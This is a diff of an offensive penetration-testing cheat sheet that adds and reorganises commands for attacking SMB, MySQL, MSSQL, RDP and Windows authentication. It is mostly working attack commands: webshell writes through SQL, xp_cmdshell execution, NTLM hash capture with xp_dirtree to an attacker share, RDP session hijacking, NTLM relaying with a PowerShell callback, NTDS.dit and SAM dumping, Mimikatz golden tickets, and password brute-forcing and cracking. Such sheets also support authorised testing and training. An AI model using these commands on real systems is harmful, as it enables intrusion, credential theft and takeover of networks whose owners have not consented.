@@ -402,8 +402,8 @@ wget -m --no-passive-ftp ftp://anonymous:anonymous@<TARGET>
 
 ## 📁 SMB/CIFS
 
-- `TCP 135`: old RPC
-- `TCP 137,138,139`: old (CIFS/SMB1)
+- `TCP 135`: RPC Endpoint Mapper (EPM)
+- `UDP 137, UDP 138, TPC 139`: legacy (CIFS/SMB1)
 - `TCP 445`: RPC/(SMB2/3)
 - Shares:
     - `C$` (drive)
@@ -428,9 +428,12 @@ wget -m --no-passive-ftp ftp://anonymous:anonymous@<TARGET>
 {{% /details %}}
 
 ```bash
+# SMB enumeration:
+sudo nmap -n -Pn -p 445 --script "smb-enum-domains,smb-os-discovery" -oA nmap_smb_domains <TARGET>
+
 # ANON: List available SMB shares
-smbclient -U "" -N --list //<TARGET>/ | tee smb_shares.txt
-smbclient -U "guest" -N --list //<TARGET>/ | tee smb_shares.txt
+smbclient -U "" -N --list
+smbclient -U "guest" -N --list //<TARGET>/
 
 # ANON: Connect to an SMB share
 smbclient -U "" -N //<TARGET>/<SHARE>
@@ -438,28 +441,41 @@ smbclient -U "guest" -N //<TARGET>/<SHARE>
 
 # Connect to SMB share
 smbclient --user=<DOMAIN>/<USERNAME> --password='<PASSWORD>' //<TARGET>/<SHARE>
-# SMB commands once connected:
-ls                    # List files
-get <FILE>           # Download file
-recurse              # Toggle directory recursion
-
-netexec smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --shares
-
+ls  # List files
+more  # read file
+get <FILE>  # Download file
+recurse  # Toggle directory recursion
+# Download recursion
+recurse on
+prompt off
+mget *
 # Execute local commands (outside of session)
 !<COMMAND>
 
-# SMB enumeration:
-sudo nmap -n -Pn -p 445 --script "smb-enum-domains,smb-os-discovery" -oA nmap_smb_domains <TARGET>
+# List shares
+netexec smb <TARGET> -u "<USERNAME>" -p "<PASSWORD>" --shares
+
+# Recursively list files
+smbmap -r --depth 3 -r <SHARE> -u <USERNAME> -p <PASSWORD> -H <IP>
+
+---
+
+# https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf
+# https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html
 
 # RPC
 rpcclient --user=<DOMAIN>/<USERNAME> --password='<PASSWORD>' <TARGET>
 srvinfo	 # Server information
-enumdomains	 # Enumerate all domains that are deployed in the network
-querydominfo	# Provides domain, server, and user information of deployed domains
-netshareenumall	 # Enumerates all available shares
-netsharegetinfo <SHARE>	 # Provides information about a specific share
+enumdomains	 # Enumerate all domains
 enumdomusers  # Enumerates all domain users
-queryuser <RID>  # user info
+querydominfo	# Provides domain, server, and user info
+netshareenumall	 # Enumerates available shares
+netsharegetinfo <SHARE>	 # Info about a specific share
+queryuser <RID>  # User info
+
+---
+
+# TODO: move these to a more appropriate/relevant section
 
 # Brute-Forcing RIDs via RPC
 for i in $(seq 500 1100);do rpcclient -N -U "" <TARGET> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
@@ -467,10 +483,8 @@ for i in $(seq 500 1100);do rpcclient -N -U "" <TARGET> -c "queryuser 0x$(printf
 # Same with other tools
 samrdump.py <TARGET>
 smbmap -H <TARGET>
-crackmapexec smb <TARGET> --shares -u '' -p ''
 
 # Enumeration SMB/NetBIOS
-enum4linux -a <TARGET> | tee enum4linux.txt
 enum4linux-ng -A <TARGET> | tee enum4linux-ng.txt
 ```
 
@@ -621,6 +635,8 @@ EXPN
 {{% /details %}}
 
 ```bash
+sudo apt install -y evolution
+
 ### Non-Interactive
 
 # IMAPS
@@ -699,84 +715,6 @@ snmpwalk -v <VERSION> -c <COMMUNITY_STRING> <TARGET> .1
 # braa usu. uses Version 1
 braa <COMMUNITY_STRING>@<TARGET>:.1.*
 braa <COMMUNITY_STRING>@<TARGET>:.1.3.6.*
-```
-
-## 🗄️ MySQL
-
-- `TCP 3306`: normal
-- Server Config:
-    - `/etc/mysql/mysql.conf.d/mysqld.cnf`
-- https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The%20mysql%20schema%20is%20the,used%20for%20other%20operational%20purposes
-
-
-{{% details "Dangerous Settings" %}}
-- https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html
-
-| **Settings**       | **Description**                                                                                              |
-| ------------------ | ------------------------------------------------------------------------------------------------------------ |
-| `user`             | Sets which user the MySQL service will run as.                                                               |
-| `password`         | Sets the password for the MySQL user.                                                                        |
-| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface.            |
-| `debug`            | This variable indicates the current debugging settings                                                       |
-| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
-| `secure_file_priv` | This variable is used to limit the effect of data import and export operations.                              |
-{{% /details %}}
-
-```bash
-# Login
-# - try "root"
-mysql -u <USER> -h <TARGET>
-mysql -u <USER> --password=<PASSWORD> -h <TARGET> -P <PORT>
-
-select version() ;
-show databases ;
-use <DATABASE> ;
-show tables ;
-show columns from <TABLE> ;
-
-select * from <TABLE> ;
-select * from <TABLE> where <COLUMN> = "<VALUE>" ;
-
-use sys ;  # tables and metadata
-select host, unique_users from host_summary ;
-
-use information_schema ;  # metadata
-```
-
-## 🗄️ MSSQL
-
-- `TCP 1433`: normal
-
-Microsoft's closed-source version of SQL.
-
-- https://www.microsoft.com/en-us/sql-server/sql-server-2019
-- https://learn.microsoft.com/en-us/ssms/install/install?view=sql-server-ver15
-- https://learn.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15
-- https://learn.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15
-
-{{% details "Dangerous Settings" %}}
-
-- MSSQL clients not using encryption to connect to the MSSQL server
-- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
-- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
-- Weak & default `sa` credentials. Admins may forget to disable this account
-
-{{% /details %}}
-
-```bash
-# Enumerate via nmap
-sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET>
-
-# Enumerate via MSF
-use auxiliary/scanner/mssql/mssql_ping
-set RHOSTS <TARGET>
-run
-
-# Login via Windows auth
-impacket-mssqlclient -windows-auth <USER>@<TARGET>
-impacket-mssqlclient -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<TARGET>
-
-select name from sys.databases ;
 ```
 
 ## 🗄️ Oracle TNS
@@ -962,10 +900,182 @@ rwho
 rusers -al <TARGET>
 ```
 
+## 🗄️ MySQL
+
+- `TCP 3306`: normal
+- Server Config:
+    - `/etc/mysql/mysql.conf.d/mysqld.cnf`
+- default system schemas/databases:
+    - `mysql` - is the system database that contains tables that store information required by the MySQL server
+    - `information_schema` - provides access to database metadata
+    - `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
+    - `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema
+- `secure_file_priv` may be set as follows:
+    - If empty, the variable has no effect, which is not a secure setting.
+    - If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
+    - If set to NULL, the server disables import and export operations
+- https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The%20mysql%20schema%20is%20the,used%20for%20other%20operational%20purposes
+
+
+{{% details "Dangerous Settings" %}}
+- https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html
+
+| **Settings**       | **Description**                                                                                              |
+| ------------------ | ------------------------------------------------------------------------------------------------------------ |
+| `user`             | Sets which user the MySQL service will run as.                                                               |
+| `password`         | Sets the password for the MySQL user.                                                                        |
+| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface.            |
+| `debug`            | This variable indicates the current debugging settings                                                       |
+| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
+| `secure_file_priv` | This variable is used to limit the effect of data import and export operations.                              |
+{{% /details %}}
+
+```bash
+# Login
+# - try "root"
+mysql -u <USER> -h <TARGET>
+mysql -u <USER> --password=<PASSWORD> -P <PORT> -h <TARGET>
+
+select version() ;
+show databases ;
+use <DATABASE> ;
+show tables ;
+show columns from <TABLE> ;
+
+SELECT * FROM users ;
+select * from <TABLE> ;
+select * from <TABLE> where <COLUMN> = "<VALUE>" ;
+
+use sys ;  # tables and metadata
+select host, unique_users from host_summary ;
+
+use information_schema ;  # metadata
+
+### Read Files
+# NOTE: not normal
+select LOAD_FILE("/etc/passwd");
+
+### Write Files (to achieve command execution)
+show variables like "secure_file_priv";
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+```
+
+## 🗄️ Win: MSSQL
+
+- `TCP/UDP 1433`: normal
+- `TCP 2433`: hidden mode
+- default system schemas/databases:
+    - `master` - keeps the information for an instance of SQL Server.
+    - `msdb` - used by SQL Server Agent.
+    - `model` - a template database copied for each new database.
+    - `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
+    - `tempdb` - keeps temporary objects for SQL queries.
+- `xp_cmdshell`:
+    - `xp_cmdshell` is a powerful feature and disabled by default. It can be enabled and disabled by using the Policy-Based Management or by executing `sp_configure`
+    - The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
+    - `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed
+
+Microsoft's closed-source version of SQL.
+
+- https://www.microsoft.com/en-us/sql-server/sql-server-2019
+- https://learn.microsoft.com/en-us/ssms/install/install?view=sql-server-ver15
+- https://learn.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15
+- https://learn.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15
+
+{{% details "Dangerous Settings" %}}
+
+- MSSQL clients not using encryption to connect to the MSSQL server
+- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
+- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
+- Weak & default `sa` credentials. Admins may forget to disable this account
+
+{{% /details %}}
+
+```bash
+# Enumerate via nmap
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET>
+
+# Enumerate via MSF
+use auxiliary/scanner/mssql/mssql_ping
+set RHOSTS <TARGET>
+run
+
+### Login via Windows auth
+impacket-mssqlclient -windows-auth <DOMAIN>/<USER>@<TARGET>
+impacket-mssqlclient <USER>:<PASSWORD>@<TARGET>
+
+SELECT @@version;
+SELECT user_name();
+SELECT system_user;
+SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1+ is admin
+SELECT name FROM master..syslogins;
+SELECT name FROM master..sysdatabases;
+
+# show tables ;
+USE <DATABASE> ;
+SELECT name FROM sys.tables;
+
+---
+
+### Read Files
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+
+### Write Files (to achieve command execution)
+sp_configure 'show advanced options', 1
+RECONFIGURE
+sp_configure 'Ole Automation Procedures', 1
+RECONFIGURE
+
+DECLARE @OLE INT
+DECLARE @FileID INT
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+EXECUTE sp_OADestroy @FileID
+EXECUTE sp_OADestroy @OLE
+
+### Enable xp_cmdshell
+EXECUTE sp_configure 'show advanced options', 1
+RECONFIGURE
+EXECUTE sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+
+xp_cmdshell 'whoami'
+
+### Impersonate User
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' ;
+
+# Verify
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+# 0 is NOT admin
+
+# Impersonating the SA User
+USE master
+EXECUTE AS LOGIN = 'sa'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+
+### Linked Servers
+SELECT srvname, isremote FROM sysservers
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<TARGET>\SQLEXPRESS]
+
+---
+
+### Capture NTLM Hash
+sudo responder -I <INTERFACE>
+
+# XP_DIRTREE Hash Stealing
+EXEC master..xp_dirtree '\\<ATTACKER>\share'
+# XP_SUBDIRS Hash Stealing
+EXEC master..xp_subdirs '\\<ATTACKER>\share'
+```
+
 ## 🖥️ Win: RDP
 
 - `TCP 3389`: normal
 - `UDP 3389`: automatic w/ RDP 8.0+ for performance (frames, audio, etc.)
+- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon
 
 Also called "Terminal Services".
 
@@ -983,6 +1093,17 @@ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-che
 xfreerdp3 +multitransport /clipboard /dynamic-resolution /cert:ignore /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /drive:'/usr/share/windows-resources/mimikatz/x64',share
 
 \\tsclient\share\mimikatz.exe
+
+---
+
+# Impersonate other logged-in user
+# NOTE: needs SYSTEM
+query.exe user
+tscon.exe <SESSION_ID> /dest:<SESSION_NAME>
+
+# Local Admin => SYSTEM
+sc.exe create sessionhijack binpath= "cmd.exe /k tscon.exe <SESSION_ID> /dest:<SESSION_NAME>"
+net.exe start sessionhijack
 ```
 
 ## 🔌 Win: WinRM
@@ -1045,10 +1166,10 @@ netexec winrm <TARGET> -u <USERS> -p <PASSWORDS>
 
 ```bash
 # Web Login brute-force (ONLINE - use small wordlist to avoid lockouts)
-hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V -o hydra_web_login.txt
+hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -VF -o hydra_web_login.txt
 
 # Wordpress brute-force login form with a complex request string (ONLINE - use small wordlist)
-hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username' -V -o hydra_wp_login.txt
+hydra -t 16 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt <TARGET> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username' -VF -o hydra_wp_login.txt
 
 # SSH brute-force; -t 4 is recommended for SSH (ONLINE - use small wordlist)
 hydra -t 4 -l <USER> -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ssh://<TARGET>:<PORT> -o hydra_ssh_login.txt
@@ -1174,6 +1295,7 @@ services -S <SEARCH>
 
 - https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
 - https://highon.coffee/blog/reverse-shell-cheat-sheet/
+- https://www.revshells.com/
 - URL ENCODE: https://www.urlencoder.org/
 
 ```bash
@@ -1287,6 +1409,19 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -f war
 
 # BACKDOOR-ed EXECUTABLES
 msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<TARGET> LPORT=<TARGET_PORT> -k -x <INPUT_FILE> -e x86/shikata_ga_nai -a x86 --platform windows -o <OUTPUT_FILE> -i 5
+```
+
+## 🛑 Responder (Multirelay)
+
+- https://www.virtuesecurity.com/kb/responder-multirelay-pentesting-cheatsheet/
+
+```bash
+# Configure listening services in: /etc/responder/Responder.conf
+sudo responder -I <INTERFACE>
+
+# Use RevShell to send a PowerShell base64 callback
+# nc -lvnp <PORT>
+impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET> -c '<POWERSHELL_CALLBACK>'
 ```
 
 ## Shell Upgrade
@@ -1717,95 +1852,31 @@ hashid -jm '<HASH>'
 cewl --lowercase -d <SPIDER_DEPTH> -m <MIN_WORD_LENGTH>  -w <WORDLIST_FILENAME>
 ```
 
-### Searching for Interesting Files
+### Windows Authentication
+#### Active Directory
 
-Unencrypted and encrypted...
-
-```bash
-# Find Potentially Useful Files
-for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*") ; do echo -e "\nFile extension: " $ext ; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ; done
-
----
-
-# Find all JtR Utilities
-sudo updatedb && locate '*2john' | grep -v 'pycache'
-
-# Zip
-zip2john <ZIP_FILE> > hash_zip.txt
-
-# RAR
-rar2john <RAR_FILE> > hash_rar.txt
-
-# Office docs
-office2john <OFFICE_FILE> > hash_office.txt
-
-# PDF
-pdf2john <PDF_FILE> > hash_pdf.txt
-
-# Bitlocker
-bitlocker2john -i <VHD_FILE> > pre_hash_vhd.txt
-grep "bitlocker\$0" pre_hash_vhd.txt > hash_crackme_vhd.txt
-hashcat -a 0 -m 22100 hash_crackme_vhd.txt <WORDLIST>
-
-# Mount w/ Bitlocker
-sudo apt install -y dislocker
-sudo mkdir -p /media/{bitlocker,bitlockermount}
-sudo losetup -f -P Backup.vhd
-ls -la /dev/loop*
-sudo dislocker /dev/<LOOP_DEV> -u<PASSWORD> -- /media/bitlocker
-sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
-
-# SSH: find Private Keys
-grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
-# See if private key is password protected
-ssh-keygen -yf <PRIVKEY>
-# Get hash of key
-ssh2john <PRIVKEY> > ssh.hash
-
-# OpenSSL
-while read p; do
-    openssl enc -aes-256-cbc -d -in <ENC_FILE> -k "$p" 2>/dev/null | tar xz 2>/dev/null
-    if [ $? -eq 0 ]; then
-        echo "Success! Password is: $p"
-        break
-    fi
-done < <WORDLIST>
-```
-
-#### Windows Creds
-
-- https://attack.mitre.org/techniques/T1003/002/
+Get `NTDS.dit` (keys of the kingdom)
 
 ```bash
-# ATTACKER: create SMB share
+# Find Users
+kerbrute userenum --dc <DC_IP> -d <DOMAIN_NAME> <USERNAME_LIST>
 
-# TARGET: save creds hives
-reg.exe save HKLM\SAM "%APPDATA%\sam.save"
-reg.exe save hklm\SYSTEM "%APPDATA%\system.save"
-reg.exe save hklm\SECURITY "%APPDATA%\security.save"
+# SMB Brute-Force
 
-cd %APPDATA%
-move *.save \\<ATTACKER_IP\<SHARE>\
+# Copy NTDS.dit
+# NOTE: hashes in NTDS are encrypted with DPAPI key in SYSTEM
+vssadmin list shadows
+vssadmin CREATE SHADOW /For=C:
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<NUM>\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 
-# ATTACKER: extract local NT hashes
-impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
-
-# 1000 is for NT hashes
-hashcat -m 1000 <HASHES> <WORDLIST>
-# 2100 is for PBKDF2 (DCC2 hashes for domain)
-hashcat -m 2100 <HASHES> <WORDLIST>
-
-# DPAPI creds
-mimikatz.exe
-dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+# Download it and impacket-secretsdump
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 ```
 
-##### Hash Defaults of LM or NTLM
-
-| Hash Value                             | Type   | Meaning / Context                                                                                                            |
-| :------------------------------------- | :----- | :--------------------------------------------------------------------------------------------------------------------------- |
-| **`aad3b435b51404eeaad3b435b51404ee`** | **LM** | **Empty / Disabled.** LM is disabled on modern Windows, so this is the placeholder you will see for *every* user. Ignore it. |
-| **`31d6cfe0d16ae931b73c59d7e0c089c0`** | **NT** | **Empty String.** The user has **no password**. Common for `Guest` or `Administrator` if not enabled/set.                    |
+```bash
+# Same as above but easier
+netexec smb <TARGET> -u <ADMIN_USER> -p <PASSWORD> -M ntdsutil
+```
 
 #### LSASS
 
@@ -1860,17 +1931,179 @@ privilege::debug
 sekurlsa::credman
 ```
 
-#### LaZange
+#### Creds Harvesting
 
 ```bash
 # https://github.com/AlessandroZ/LaZagne
-mkdir www; cd www; wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
+wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe -O lazagne.exe
 
-# TARGET:
-.\lazagne.exe all
+# MOUDLES: browsers, sysadmin, memory, windows, chats, mails, wifi
+.\lazagne.exe all -oA -output creds
+
+# Decrypting Firefox or Chrome creds storage
+# - https://github.com/unode/firefox_decrypt
+# - https://github.com/ohyicong/decrypt-chrome-passwords
+
+---
+
+# WINDOWS: Search for plaintext creds in files
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.git *.ps1 *.yml *.xml
 ```
 
-### Common Web / Generic Constants
+#### Secrets Dumping (SAM)
+- https://attack.mitre.org/techniques/T1003/002/
+
+```bash
+# ATTACKER: create SMB share
+
+# TARGET: save creds hives
+reg.exe save HKLM\SAM "%APPDATA%\sam.save"
+reg.exe save hklm\SYSTEM "%APPDATA%\system.save"
+reg.exe save hklm\SECURITY "%APPDATA%\security.save"
+
+cd %APPDATA%
+move *.save \\<ATTACKER_IP\<SHARE>\
+
+# ATTACKER: extract local NT hashes
+impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
+
+# 1000 is for NT hashes
+hashcat -m 1000 <HASHES> <WORDLIST>
+# 2100 is for PBKDF2 (DCC2 hashes for domain)
+hashcat -m 2100 <HASHES> <WORDLIST>
+
+# DPAPI creds
+mimikatz.exe
+dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+
+##### Hash Defaults of LM or NTLM
+
+| Hash Value                             | Type   | Meaning / Context                                                                                                            |
+| :------------------------------------- | :----- | :--------------------------------------------------------------------------------------------------------------------------- |
+| **`aad3b435b51404eeaad3b435b51404ee`** | **LM** | **Empty / Disabled.** LM is disabled on modern Windows, so this is the placeholder you will see for *every* user. Ignore it. |
+| **`31d6cfe0d16ae931b73c59d7e0c089c0`** | **NT** | **Empty String.** The user has **no password**. Common for `Guest` or `Administrator` if not enabled/set.                    |
+
+### 🔐 Mimikatz Commands
+
+```bash
+# Basic Mimikatz Usage
+\\tsclient\share\mimikatz.exe
+privilege::debug
+
+# Dumps all
+sekurlsa::logonpasswords
+
+# Dump Hashes
+lsadump::lsa /patch
+
+# Golden Ticket Attack
+lsadump::lsa /inject /name:krbtgt
+kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM> /id:500
+misc::cmd
+# Opens new command prompt with golden ticket context
+```
+
+### Linux Authentication
+
+Credentials Harvesting
+
+```bash
+# LINUX: Find Potentially Useful Files
+for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*") ; do echo -e "\nFile extension: " $ext ; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ; done
+
+# Text files
+find /home/* -type f -name "*.txt" -o ! -name "*.*"
+
+# Crontab
+cat /etc/crontab
+ls -la /etc/cron.*/
+
+# Maybe creds in /home/*/
+find /home/ -type f \( -name '.*rc' -o -name '.*history' -o -name 'config.fish' -o -name '.*login' \)
+# Browser creds
+ls -l .mozilla/firefox/ | grep default
+wget https://github.com/unode/firefox_decrypt/raw/refs/heads/main/firefox_decrypt.py
+python3 firefox_decrypt.py
+
+# Logs
+for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
+
+# Config
+for ext in .conf .config .cnf; do out=$(find / -name "*$ext" 2>/dev/null | grep -vE "lib|fonts|share|core"); [ -n "$out" ] && echo -e "\nFile extension: $ext" && echo "$out"; done
+
+# Pass in configs
+for i in $(find / -name "*.cnf" 2>/dev/null | grep -vE "doc|lib"); do out=$(grep -E "user|password|pass" "$i" 2>/dev/null | grep -v "#"); [ -n "$out" ] && echo -e "\nFile: $i" && echo "$out"; done
+
+# Database
+for ext in .sql .db ".*db" ".db*"; do out=$(find / -name "*$ext" 2>/dev/null | grep -vE "doc|lib|headers|share|man"); [ -n "$out" ] && echo -e "\nDB File extension: $ext" && echo "$out"; done
+
+# Code
+for ext in .py .pyc .pl .go .jar .c .sh; do out=$(find / -name "*$ext" 2>/dev/null | grep -vE "doc|lib|headers|share"); [ -n "$out" ] && echo -e "\nFile extension: $ext" && echo "$out"; done
+```
+
+### Cracking Passwords
+
+#### Username Generation
+
+```bash
+# GOOGLE DORK: Find emails and user name scheme
+site:<DOMAIN> "@<DOMAIN>"
+
+# Generate different common permutations of usernames
+git clone https://github.com/urbanadventurer/username-anarchy && cd username-anarchy
+./username-anarchy -i <USERNAMES>
+```
+
+#### in Files
+
+```bash
+# Find all JtR Utilities
+sudo updatedb && locate '*2john' | grep -v 'pycache'
+
+# Zip
+zip2john <ZIP_FILE> > hash_zip.txt
+
+# RAR
+rar2john <RAR_FILE> > hash_rar.txt
+
+# Office docs
+office2john <OFFICE_FILE> > hash_office.txt
+
+# PDF
+pdf2john <PDF_FILE> > hash_pdf.txt
+
+# Bitlocker
+bitlocker2john -i <VHD_FILE> > pre_hash_vhd.txt
+grep "bitlocker\$0" pre_hash_vhd.txt > hash_crackme_vhd.txt
+hashcat -a 0 -m 22100 hash_crackme_vhd.txt <WORDLIST>
+
+# Mount w/ Bitlocker
+sudo apt install -y dislocker
+sudo mkdir -p /media/{bitlocker,bitlockermount}
+sudo losetup -f -P Backup.vhd
+ls -la /dev/loop*
+sudo dislocker /dev/<LOOP_DEV> -u<PASSWORD> -- /media/bitlocker
+sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
+
+# SSH: find Private Keys
+grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
+# See if private key is password protected
+ssh-keygen -yf <PRIVKEY>
+# Get hash of key
+ssh2john <PRIVKEY> > ssh.hash
+
+# OpenSSL
+while read p; do
+    openssl enc -aes-256-cbc -d -in <ENC_FILE> -k "$p" 2>/dev/null | tar xz 2>/dev/null
+    if [ $? -eq 0 ]; then
+        echo "Success! Password is: $p"
+        break
+    fi
+done < <WORDLIST>
+```
+
+#### Common Hash Values
 
 | Hash Value | Type | Meaning |
 | :--- | :--- | :--- |
@@ -1878,7 +2111,42 @@ mkdir www; cd www; wget -q https://github.com/AlessandroZ/LaZagne/releases/downl
 | **`da39a3ee5e6b4b0d3255bfef95601890afd80709`** | **SHA1** | **Empty String** (0 byte input) |
 | **`e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`** | **SHA256** | **Empty String** (0 byte input) |
 
-### Cracking Passwords
+#### Create Custom Permutated Wordlist
+
+- https://hashcat.net/wiki/doku.php?id=rule_based_attack
+
+```bash
+# Manually generate keywords or use cewl via OSINT
+cat << EOF > keywords.txt
+<KEYWORDS>
+EOF
+
+# c - Capitalize the first character, lowercase the rest
+# C - Lowercase the first character, uppercase the rest
+# t - Toggle the case of all characters in a word
+# $! - Appends the character ! to the end 
+# $1$9$9$8 - Appends '1998' to the end
+# $1$9$9$8$! - Appends '1998!' to the end
+# sa@ - Replace all instances of a with @
+# so0 - Replace all instances of o with 0
+# ss$ - Replace all instances of s with $
+cat << EOF > custom.rule
+c
+C
+t                                                                \$!
+\$1\$9\$9\$8
+\$1\$9\$9\$8\$!
+sa@
+so0
+ss\$
+EOF
+
+# Generate permutated wordlist
+hashcat --force -r custom.rule keywords.txt  --stdout | sort -u > wordlist.txt
+
+# Crack hash
+hashcat -a 0 -m <HASH_ID> -r custom.rule <HASH> wordlist.txt
+```
 
 #### 🔨  John the Ripper
 
@@ -1891,11 +2159,11 @@ john --list=formats
 # john --format=NT
 # john --format=raw-md5
 # john --format=sha512crypt
-john --format=<FORMAT> --wordlist=<WORDLIST> --output=john_cracked_hashes.txt <HASH_FILE>
+john --format=<FORMAT> --wordlist=<WORDLIST> <HASH_FILE>
 
 # Single crack mode: makes permutations given a username
 unshadow passwd.txt shadow.txt > unshadowed.txt
-john --format=<FORMAT> --single --output=john_cracked_single.txt <UNSHADOW_FILE>
+john --single <UNSHADOW_FILE>
 
 # Dynamically generated wordlist using Markov chains
 john --incremental <HASH_FILE>
@@ -1934,41 +2202,324 @@ hashcat -m 1800 -r /usr/share/hashcat/rules/best64.rule hashes.txt <WORDLIST>
 hashcat -a 3 -m <HASH_ID> <HASH> '?u?l?l?l?l?d?s'
 ```
 
-##### Create Custom Permutated Wordlist
-
-- https://hashcat.net/wiki/doku.php?id=rule_based_attack
+### Creds in Network Traffic
 
 ```bash
